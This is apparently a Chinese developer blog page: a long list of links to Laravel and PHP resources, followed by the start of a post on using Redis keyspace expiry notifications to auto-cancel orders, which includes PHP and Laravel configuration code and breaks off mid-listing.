<p><a href="https://learnku.com/articles/25270#replies" target="_blank" rel="noopener">MySQL 避坑宝典</a></p>
<p><a href="https://learnku.com/articles/29490" target="_blank" rel="noopener">文章收藏的扩展包</a></p>
<p><a href="https://learnku.com/articles/29413" target="_blank" rel="noopener">多语言与多时区的解决方案</a></p>
<p><a href="https://github.com/immortalChensm/laravel-work" target="_blank" rel="noopener">laravel框架源码分析注解</a></p>
<p><a href="https://github.com/ww285276792/todo.link" target="_blank" rel="noopener">Laravel 团队任务管理系统</a></p>
<p><a href="https://github.com/tangtanglove/fullstack" target="_blank" rel="noopener">基于 Laravel + Ant-design 界面美观漂亮的后台</a></p>
<p><a href="https://github.com/hongyukeji/laravel-translate/" target="_blank" rel="noopener">Laravel 本地语言包自动翻译插件</a></p>
<p><a href="https://learnku.com/articles/28897" target="_blank" rel="noopener">Laravel+Layim+GatewayWorker workerman 实现实时聊天功能</a></p>
<p><a href="https://github.com/ivothgle/Tampermonkey/blob/master/Laravel-doc-help.user.js" target="_blank" rel="noopener">「Laravel 文档助手」 - 油猴脚本</a></p>
<p><a href="https://github.com/hongyukeji/laravel-sms" target="_blank" rel="noopener">Laravel 短信扩展包</a></p>
<p><a href="https://learnku.com/articles/28432#topnav" target="_blank" rel="noopener">Laravel 中的事件监听</a></p>
<p><a href="https://github.com/alicfeng/laravel-runtime" target="_blank" rel="noopener">基于Laravel构建请求信息日志以及接口智能分析</a></p>
<p><a href="https://learnku.com/docs/laravel-cheatsheet/5.8" target="_blank" rel="noopener">Laravel 5.8 速查表</a></p>
<p><a href="https://github.com/Kamicloud/laravel-unofficial-relations" target="_blank" rel="noopener">Laravel 关联模型扩展</a></p>
<p><a href="https://learnku.com/laravel/t/24449#replies" target="_blank" rel="noopener">Laravel 的第三方平台登录</a></p>
<p><a href="https://learnku.com/articles/28230" target="_blank" rel="noopener">Laravel- 访问设备识别组件-BrowserDetect</a></p>
<p><a href="https://www.laravel-dojo.com/helpful-tools" target="_blank" rel="noopener">Laravel 道场</a></p>
<p><a href="https://learnku.com/articles/19427" target="_blank" rel="noopener">Laravel5.5 支付宝支付</a></p>
<p><a href="http://wangyapeng.me/2019/03/30/laravel-broadcasting/" target="_blank" rel="noopener">Laravel 广播</a></p>
<p><a href="http://wangyapeng.me/2019/01/13/upgrad-laravel-5.5-to-5.7-log/" target="_blank" rel="noopener">Laravel 5.5 升级到 5.7 小记</a></p>
<p><a href="https://www.microsoft.com/en-us/download/details.aspx?id=21138" target="_blank" rel="noopener">生成chm文档</a></p>
<p><a href="https://learnku.com/articles/19859#topnav" target="_blank" rel="noopener">深入研究 Laravel 源码第二天</a></p>
<p><a href="https://github.com/iiDestiny/dependency-injection" target="_blank" rel="noopener">依赖注入扩展包</a></p>
<p><a href="https://github.com/php-casbin/php-casbin" target="_blank" rel="noopener"> PHP 权限管理框架 Casbin</a></p>
<p><a href="https://github.com/foryoufeng/laravel-generator" target="_blank" rel="noopener">laravel 代码生成器 2.0</a></p>
<p><a href="https://learnku.com/blog/Wi1dcard/tags/easy-deployment-of-laravel-applications_50034" target="_blank" rel="noopener">轻松部署 Laravel 应用</a></p>
<p><a href="https://divinglaravel.com/" target="_blank" rel="noopener">深入了解 Laravel 的工作机制</a></p>
<p><a href="https://learnku.com/articles/27934#reply87814" target="_blank" rel="noopener">Laravel 中 IoC 容器</a></p>
<p><a href="https://learnku.com/docs/the-laravel-way/5.6/Tao-1-1/2925" target="_blank" rel="noopener">laravel之道系列</a></p>
<p><a href="https://github.com/kevinyan815/Learning_Laravel_Kernel" target="_blank" rel="noopener">Laravel核心代码学习</a></p>
<p><a href="https://learnku.com/laravel/t/14204/so-what-is-this-register-for" target="_blank" rel="noopener">laravel服务容器</a></p>
<p><a href="https://learnku.com/laravel/t/10781/who-can-compare-the-life-cycle-of-laravel-to-a-more-vivid-image" target="_blank" rel="noopener">Laravel 的生命周期比喻的更形象一点</a></p>
<p><a href="https://learnku.com/articles/26282#topnav" target="_blank" rel="noopener">paypal PHP-sdk 支付 / 回调 / 退款全流程</a></p>
<p><a href="https://github.com/SadCreeper/laravel-react-blog" target="_blank" rel="noopener">Laravel 5.5 和 React 的个人博客系统</a></p>
<p><a href="https://learnku.com/articles/27716" target="_blank" rel="noopener">Laravel 从零单排系列教程</a></p>
<p><a href="https://github.com/eddy8/lightCMS/blob/master/app/functions.php#L65-L103" target="_blank" rel="noopener">基于 Tire 树的敏感词检测</a></p>
<p><a href="https://learnku.com/articles/22307#topnav" target="_blank" rel="noopener">QQ 第三方登录</a></p>
<p><a href="https://learnku.com/articles/27712#topnav" target="_blank" rel="noopener">PHP 有限状态机</a></p>
<p><a href="https://github.com/godruoyi/gblog" target="_blank" rel="noopener">laravel vue博客</a></p>
<p><a href="https://learnku.com/articles/18704" target="_blank" rel="noopener">Voyager 的使用及二次开发</a></p>
<p><a href="https://learnku.com/articles/26344" target="_blank" rel="noopener"> Composer 自动加载源码</a></p>
<p><a href="https://learnku.com/articles/26735#topnav" target="_blank" rel="noopener">GitLab CI 踩坑</a></p>
<p><a href="https://learnku.com/articles/19868#topnav" target="_blank" rel="noopener">小白折腾服务器（一）：docker 搭建 lnmp+ 使用 deployer 部署</a></p>
<p><a href="https://learnku.com/laravel/t/9365/teach-you-to-write-modern-php-code-without-using-a-framework" target="_blank" rel="noopener">不使用框架的情况下也能写出现代化 PHP 代码</a></p>
<p><a href="https://learnku.com/laravel/t/26103" target="_blank" rel="noopener">基于 Laravel 的 CMS</a></p>
<p><a href="https://github.com/Adldap2/Adldap2-Laravel" target="_blank" rel="noopener">Laravel LDAP 包</a></p>
<p><a href="https://learnku.com/articles/27824#reply87460" target="_blank" rel="noopener">PhpSpreadsheet 简单 Excel 导入导出</a></p>
<p><a href="https://learnku.com/articles/25130" target="_blank" rel="noopener">valet 切换 PHP 版本</a></p>
<p><a href="https://github.com/cknow/laravel-money" target="_blank" rel="noopener">Laravel Money 金钱单位格式化</a></p>
<p><a href="https://learnku.com/articles/27806#topnav" target="_blank" rel="noopener">Laravel 中自定义用户登录的数据表users</a></p>
<p><a href="https://learnku.com/articles/14145/rely-on-inversion-control-inversion-ioc-container-dependency-injection#topnav" target="_blank" rel="noopener">浅析依赖倒转、控制反转、IoC 容器、依赖注入</a></p>
<p><a href="https://learnku.com/articles/22769#topnav" target="_blank" rel="noopener">用语言 (非代码) 说清楚 IoC 到底是什么</a></p>
<p><a href="https://1024casts.com/topics/21" target="_blank" rel="noopener">PHP中的依赖注入（DI）容器</a></p>
<p><a href="https://learnku.com/laravel/t/27647#e9289b" target="_blank" rel="noopener">十五个常用的 Laravel 集合</a></p>
<p><a href="https://learnku.com/articles/19195#topnav" target="_blank" rel="noopener">Laravel 服务容器，IoC,DI</a></p>
<p><a href="https://learnku.com/articles/17638" target="_blank" rel="noopener">Laravel 服务容器、服务提供器、契约实例讲解</a></p>
<p><a href="https://learnku.com/articles/19195" target="_blank" rel="noopener">Laravel 服务容器，IoC,DI</a></p>
<p><a href="https://learnku.com/articles/27606#topnav" target="_blank" rel="noopener">《提问的智慧》小测验</a></p>
<p><a href="https://learnku.com/articles/27623" target="_blank" rel="noopener">Laravel 使用 Elasticsearch 全局搜索</a></p>
<p><a href="http://worthly.cn/2018/05/27/algorithm-test/" target="_blank" rel="noopener">PHP实现的一些算法例子</a></p>
<p><a href="http://worthly.cn/2018/06/02/computer-network-reading-notes/" target="_blank" rel="noopener">计算机网络读书笔记</a></p>
<p><a href="http://worthly.cn/2017/12/19/php-regular-preg-match-matching-length-limit/" target="_blank" rel="noopener">正则preg_match匹配长度</a></p>
<p><a href="https://learnku.com/laravel/t/27590" target="_blank" rel="noopener">优酷 YouKu OAuth2 第三方登录库</a></p>
<p><a href="https://github.com/changeweb/Unifiedtransform" target="_blank" rel="noopener">开源学校管理系统</a></p>
<p><a href="https://learnku.com/articles/27556" target="_blank" rel="noopener">超全的设计模式简介</a></p>
<p><a href="https://www.tangshuang.net/1682.html" target="_blank" rel="noopener">如何应对服务器压力</a></p>
<p><a href="https://www.tangshuang.net/6192.html" target="_blank" rel="noopener">数据库中用一个值来保存多种情况：二进制和按位异或</a></p>
<p><a href="https://www.tangshuang.net/1693.html" target="_blank" rel="noopener">在阿里云上搭建自己的git服务器</a></p>
<p><a href="https://learnku.com/articles/27446" target="_blank" rel="noopener">RabbitMQ 的应用场景以及基本原理介绍</a></p>
<p><a href="https://www.tangshuang.net/1774.html" target="_blank" rel="noopener">编译安装nginx1.9.7+php7.0.0</a></p>
<p><a href="https://learnku.com/articles/25947" target="_blank" rel="noopener"> Laravel 开发 API 更得心应手</a></p>
<p><a href="https://learnku.com/articles/22616" target="_blank" rel="noopener">别再使用 JWT 作为 Session 系统</a></p>
<p><a href="https://www.tangshuang.net/4100.html" target="_blank" rel="noopener">同一公司下多产品的用户权限管理系统设计</a></p>
<p><a href="https://github.com/xx19941215/light-tips" target="_blank" rel="noopener">数据结构和算法</a></p>
<p><a href="https://www.tangshuang.net/2794.html" target="_blank" rel="noopener">PHP中关于时间（戳）、时区</a></p>
<p><a href="https://github.com/peinhu/AetherUpload-Laravel" target="_blank" rel="noopener">大文件上传扩展</a></p>
<p><a href="https://learnku.com/laravel/t/26674" target="_blank" rel="noopener">Laravel 微信小程序后端搭建</a></p>
<p><a href="https://tianyong90.com/2019/03/10/yong-algolia-docsearch-qing-song-shi-xian-wen-dang-quan-zhan-sou-suo/#algolia-docsearch-的基本原理和主要优势" target="_blank" rel="noopener"> Algolia DocSearch 轻松实现文档全站搜索</a></p>
<p><a href="https://learnku.com/articles/26987" target="_blank" rel="noopener">SOLID 设计原则</a></p>
<p><a href="https://blog.yiranzai.cn/posts/991/" target="_blank" rel="noopener">MySQL分组查询TOP N的实践和踩坑</a></p>
<p><a href="https://learnku.com/articles/25111#topnav" target="_blank" rel="noopener">不要在循环体中使用 array_merge ()</a></p>
<p><a href="https://github.com/uuk020/logistics" target="_blank" rel="noopener">查询物流信息的扩展包</a></p>
<p><a href="https://learnku.com/laravel/t/27041" target="_blank" rel="noopener">PHPStrom 转 VSCode 折腾记录</a></p>
<p><a href="https://learnku.com/articles/19195" target="_blank" rel="noopener">【看完就懂】Laravel 服务容器，IoC,DI</a></p>
<p><a href="https://learnku.com/articles/25760" target="_blank" rel="noopener">整理 PC 端微信扫码支付全过程 — easywechat + Laravel 5.8</a></p>
<p><a href="https://learnku.com/laravel/t/24161" target="_blank" rel="noopener">Laravel Excel 的五个隐藏功能</a></p>
<p><a href="https://learnku.com/articles/22094" target="_blank" rel="noopener">woann-chat 基于 laravelS 和 layim 的聊天系统</a></p>
<p><a href="https://learnku.com/laravel/t/19023" target="_blank" rel="noopener">Laravel-Excel 3.0 文档</a></p>
<p><a href="https://learnku.com/articles/19589" target="_blank" rel="noopener"> Laravel 进阶教程</a></p>
<p><a href="https://learnku.com/articles/18637" target="_blank" rel="noopener">Laravel Redis 广播 实例</a></p>
<p><a href="https://learnku.com/laravel/t/26281" target="_blank" rel="noopener">基于 The 996 Prohibited License 的项目Laravel-admin-select2</a></p>
<p><a href="https://learnku.com/articles/22046" target="_blank" rel="noopener">处理 API 数据格式</a></p>
<p><a href="https://learnku.com/articles/26733" target="_blank" rel="noopener">Laravel 项目全自动接口管理</a></p>
<p><a href="https://learnku.com/articles/26710#topnav" target="_blank" rel="noopener">Auth 2.0 的一种简单解释</a></p>
<p><a href="https://dmmylove.cn/articles/97" target="_blank" rel="noopener">Laravel 从零单排系列教程 </a></p>
<p><a href="https://learnku.com/articles/24219" target="_blank" rel="noopener">Laravel 5.7 和 JSON Web 令牌（tymon/jwt-auth） - 用户认证</a></p>
<p><a href="https://learnku.com/articles/26343#topnav" target="_blank" rel="noopener">生产环境的 Composer</a></p>
<p><a href="https://learnku.com/laravel/wikis/27707" target="_blank" rel="noopener">输出 SQL 语句</a></p>
<p><a href="https://learnku.com/laravel/t/27688" target="_blank" rel="noopener">Laravel Passport 为你的 REST API 增加用户认证功能</a></p>
<p><a href="https://learnku.com/articles/25111#topnav" target="_blank" rel="noopener">不要在循环体中使用 array_merge ()</a></p>
<p><a href="https://haoruijie.art/2019/04/18/the-secret-of-throttle.html" target="_blank" rel="noopener">Laravel API throttle 限流原理分析</a></p>
<p><a href="https://learnku.com/articles/27389" target="_blank" rel="noopener">Laravel 登录原理剖析</a></p>
<p><a href="https://learnku.com/laravel/wikis/25515" target="_blank" rel="noopener">Laravel 安装和开发环境</a></p>
<p><a href="https://learnku.com/articles/25858" target="_blank" rel="noopener">Cookie 禁用了，Session 还能用吗</a></p>
<p><a href="https://github.com/OMGZui/DesignPattern" target="_blank" rel="noopener">设计模式</a></p>
<p><a href="https://learnku.com/articles/25204" target="_blank" rel="noopener">PHP 详细面试总结</a></p>
<p><a href="https://github.com/baijunyao/design-patterns" target="_blank" rel="noopener">php设计模式 https://baijunyao.com/</a></p>
<p><a href="https://learnku.com/docs/php-design-patterns/2018" target="_blank" rel="noopener">《PHP 设计模式全集 2018》</a></p>
<p><a href="https://learnku.com/articles/26825" target="_blank" rel="noopener">Laravel Markdown Blog</a></p>
<p><a href="https://learnku.com/articles/24982" target="_blank" rel="noopener">设计模式超级简单的解释</a></p>
<p><a href="https://learnku.com/articles/26864#topnav" target="_blank" rel="noopener">Laravel Markdown Blog learnku.net </a></p>
<p><a href="https://learnku.com/articles/26850" target="_blank" rel="noopener">PHP 开发环境安装配置Laradock</a></p>
<p><a href="https://github.com/valiner/identicon-avatar" target="_blank" rel="noopener">头像自动生成</a></p>
<p><a href="https://learnku.com/articles/20990" target="_blank" rel="noopener"> Laravel-admin 集成 Markdown 编辑器</a></p>
<p><a href="https://learnku.com/articles/26180" target="_blank" rel="noopener">swoole 邮件系统</a></p>
<p><a href="https://learnku.com/laravel/t/22814" target="_blank" rel="noopener">Laravel 测试之 —— PHPUnit 入门教程</a></p>
<p><a href="https://learnku.com/articles/26343" target="_blank" rel="noopener">composer 解析</a></p>
<p><a href="https://learnku.com/articles/24217" target="_blank" rel="noopener">Laravel 5.7 撸了一个论坛</a></p>
<p><a href="https://learnku.com/articles/27539" target="_blank" rel="noopener">Laravel 文档助手」 - 油猴脚本</a></p>
<p><a href="https://learnku.com/articles/27029#topnav" target="_blank" rel="noopener">全新搭建 PHP 开发环境</a></p>
<p><a href="https://learnku.com/articles/25444" target="_blank" rel="noopener">编写具有描述性的 RESTful API </a></p>
<p><a href="https://learnku.com/articles/25983" target="_blank" rel="noopener"> Laravel-China 课程文章同步发布</a></p>
<p><a href="https://learnku.com/articles/26686" target="_blank" rel="noopener">代理与反向代理、负载均衡和缓存</a></p>
<p><a href="https://learnku.com/articles/20311" target="_blank" rel="noopener">Laravel5.5 使用 Elasticsearch 做引擎</a></p>
<p><a href="https://learnku.com/laravel/t/22639" target="_blank" rel="noopener">Laravel Eloquent 小技巧</a></p>
<p><a href="https://learnku.com/articles/18697" target="_blank" rel="noopener">Laravel Cron 定时任务 “跳坑” 点</a></p>
<p><a href="https://learnku.com/articles/25798" target="_blank" rel="noopener">Laravel + Laravel-echo + EasyWeChat 实现微信扫码登录</a></p>
<p><a href="https://learnku.com/articles/20247" target="_blank" rel="noopener">你可能不太需要 Laravel-Excel</a></p>
<p><a href="https://learnku.com/articles/21812#99dc86" target="_blank" rel="noopener">Oss Flysystem 扩展</a></p>
<p><a href="https://learnku.com/articles/21522" target="_blank" rel="noopener">Laravel5.6 整合 RabbitMQ 消息队列</a></p>
<p><a href="https://learnku.com/laravel/t/26110" target="_blank" rel="noopener">Laravel 集合（Collection）的基础用法</a></p>
<p><a href="https://learnku.com/articles/20031" target="_blank" rel="noopener">『 OAuth2.0』 猴子都能懂的图解</a></p>
<p><a href="https://learnku.com/laravel/t/22473" target="_blank" rel="noopener"> Laravel 的消息通知系统</a></p>
<p><a href="https://learnku.com/laravel/t/25013" target="_blank" rel="noopener"> Laravel 项目中使用 Elasticsearch 做引擎</a></p>
<p><a href="https://learnku.com/articles/17867" target="_blank" rel="noopener">简聊 Session 与 Token 身份验证</a></p>
<p><a href="https://learnku.com/laravel/t/24767" target="_blank" rel="noopener">六个值得参考的 Laravel 开源项目</a></p>
<p><a href="https://learnku.com/articles/19878" target="_blank" rel="noopener">Laravel 启动流程分析</a></p>
<p><a href="https://learnku.com/articles/25208" target="_blank" rel="noopener">Lumen/Laravel 集成 GatewayWorker (Workerman)，实现简单的聊天系统.</a></p>
<p><a href="https://www.debuginn.cn/study-laravel-1-setting.html" target="_blank" rel="noopener">Laravel踩坑日记之基本配置及Demo</a></p>
<p><a href="https://github.com/Jasongzj/laravel-qcloud-image" target="_blank" rel="noopener">腾讯云智 AI 图像服务的 Laravel SDK</a></p>
<p><a href="https://vien.tech/article/134" target="_blank" rel="noopener">基于Laravel支持markdown的博客Vien Blog</a></p>
<p><a href="https://learnku.com/articles/28578" target="_blank" rel="noopener">Laravel 团队任务管理系统</a></p>
<p><a href="https://learnku.com/articles/27539" target="_blank" rel="noopener">「Laravel 文档助手」 - 油猴脚本</a></p>
<p><a href="https://learnku.com/articles/28637" target="_blank" rel="noopener"> 队列原理分析</a></p>
<p><a href="https://github.com/tsmliyun/laravel_quick_admin" target="_blank" rel="noopener">Laravel + H-ui 搭建后台管理系统</a></p>
<p><a href="https://pinapp.github.io/laravel-shou-ce" target="_blank" rel="noopener">laravel手册</a></p>
<p><a href="https://laravelcode.cn/docs/5.8" target="_blank" rel="noopener">基于 larecipe 做的 Laravel 速查表</a></p>
<p><a href="https://github.com/ratchetphp/Pawl" target="_blank" rel="noopener">Laravel 中连接 Webscoket</a></p>
<p><a href="https://github.com/aoxiang594/infyom-laravel-generator-simple-document" target="_blank" rel="noopener">自动生成 CURD</a></p>
<p><a href="https://github.com/wmhello/laravel_template_with_vue" target="_blank" rel="noopener">laravel5.5和vue.js结合的前后端分离项目模板websocket聊天室</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/26/redis-记录/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="苏生不惑">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="苏生不惑的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/26/redis-记录/" itemprop="url">redis 记录</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-26T11:40:52+08:00">
                2019-03-26
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  16.1k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  70 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="指定时间自动取消订单"><a href="#指定时间自动取消订单" class="headerlink" title="指定时间自动取消订单"></a>指定时间自动取消订单</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>) 使用Linux内置的crontab定时任务，每隔几秒甚至几分钟轮训遍历一次数据库，找到超出时间间隔的订单，进行取消。这种办法没有失效性以及在没有订单的时间内属于浪费服务器资源。</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>) 使用框架内置的延时处理机制。比如Laravel的队列任务，可以指定多少分钟后执行。这样就能判断订单是否超出时间间隔，是否要取消订单恢复库存量。</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>) 使用Redis的keyspace notification（键空间通知）。Redis可以设置一个key到多久时间后过期,比如:SETEX name <span class="number">123</span> <span class="number">20</span>,设置name在<span class="number">20</span>秒后过期。此时，过期会触发事件发布，所有redis客户端都会订阅，获得相关信息。</span><br><span class="line"><span class="comment">//https://www.guaosi.com/2019/02/25/automatically-cancel-the-order/</span></span><br><span class="line">vim usr/local/etc/redis/redis.conf</span><br><span class="line">notify-keyspace-events <span class="string">"Ex"</span></span><br><span class="line">service redis-server restart /usr/local/etc/redis/redis.conf</span><br><span class="line">会监听<span class="number">0</span>号库所有过期的key</span><br><span class="line">redis-cli</span><br><span class="line">psubscribe __keyevent@<span class="number">0</span>__:expired 监听<span class="number">0</span>号库所有过期的key</span><br><span class="line">setex name <span class="number">5</span> guaosi</span><br><span class="line"><span class="number">5</span>秒后，原终端会输出如下</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>) <span class="string">"pmessage"</span></span><br><span class="line"><span class="number">2</span>) <span class="string">"__keyevent@0__:expired"</span></span><br><span class="line"><span class="number">3</span>) <span class="string">"__keyevent@0__:expired"</span></span><br><span class="line"><span class="number">4</span>) <span class="string">"name"</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MRedis</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    private $redis;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 构造函数</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @param string $host 主机号</span></span><br><span class="line"><span class="comment">     * @param int $port 端口号</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$host = <span class="string">'redis'</span>, $port = <span class="number">6379</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;redis = <span class="keyword">new</span> redis();</span><br><span class="line">        $<span class="keyword">this</span>-&gt;redis-&gt;connect($host, $port);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">expire</span>(<span class="params">$key = null, $time = <span class="number">0</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;redis-&gt;expire($key, $time);</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">psubscribe</span>(<span class="params">$patterns = array(</span>), <span class="title">$callback</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;redis-&gt;psubscribe($patterns, $callback);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">setOption</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;redis-&gt;setOption(Redis::OPT_READ_TIMEOUT, <span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//变量$msg就是过期的key的名称，我们只能获取到key的名称，不能获得到原来设置的值。</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callback</span>(<span class="params">$redis, $pattern, $chan, $msg</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 回调函数,这里写处理逻辑</span></span><br><span class="line">    echo <span class="string">"Pattern: $pattern\n"</span>;</span><br><span class="line">    echo <span class="string">"Channel: $chan\n"</span>;</span><br><span class="line">    echo <span class="string">"Payload: $msg\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$redis = <span class="keyword">new</span> MRedis();</span><br><span class="line"><span class="comment">//redis会有默认连接时间，对 redis客户端进行一些参数设置，使读取超时参数 为 -1，表示不超时。</span></span><br><span class="line">$redis-&gt;setOption();</span><br><span class="line"><span class="comment">//这里输入订阅，以及订阅成功后触发的函数名</span></span><br><span class="line"><span class="comment">//监听库为0里的过期key</span></span><br><span class="line">$redis-&gt;psubscribe(array(<span class="string">'__keyevent@0__:expired'</span>), <span class="string">'callback'</span>);</span><br><span class="line">php test.php</span><br><span class="line"></span><br><span class="line">larvel config/database.php</span><br><span class="line"><span class="string">'redis'</span> =&gt; [</span><br><span class="line">         <span class="string">'client'</span> =&gt; <span class="string">'predis'</span>,</span><br><span class="line">         <span class="string">'default'</span> =&gt; [</span><br><span class="line">             <span class="string">'host'</span> =&gt; env(<span class="string">'REDIS_HOST'</span>, <span class="string">'127.0.0.1'</span>),</span><br><span class="line">             <span class="string">'password'</span> =&gt; env(<span class="string">'REDIS_PASSWORD'</span>, <span class="literal">null</span>),</span><br><span class="line">             <span class="string">'port'</span> =&gt; env(<span class="string">'REDIS_PORT'</span>, <span class="number">6379</span>),</span><br><span class="line">             <span class="string">'database'</span> =&gt; env(<span class="string">'REDIS_DATABASE'</span>, <span class="number">0</span>),</span><br><span class="line">             <span class="string">'persistent'</span> =&gt; <span class="literal">true</span>, <span class="comment">// 开启持久连接</span></span><br><span class="line">             <span class="string">'read_write_timeout'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">             <span class="comment">//据Predis作者在配置文件中说明</span></span><br><span class="line">             <span class="comment">//因为在底层网络资源上执行读取或写入操作时使用了超时，默认设置了timeout 为60s。</span></span><br><span class="line">             <span class="comment">//到60s自动断开并报错.设置成0可以解决这个问题。</span></span><br><span class="line">         ],</span><br><span class="line"> </span><br><span class="line">     ],</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrderController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span><br><span class="line">    <span class="comment">//创建用户订单</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">store</span>(<span class="params">Request $request</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       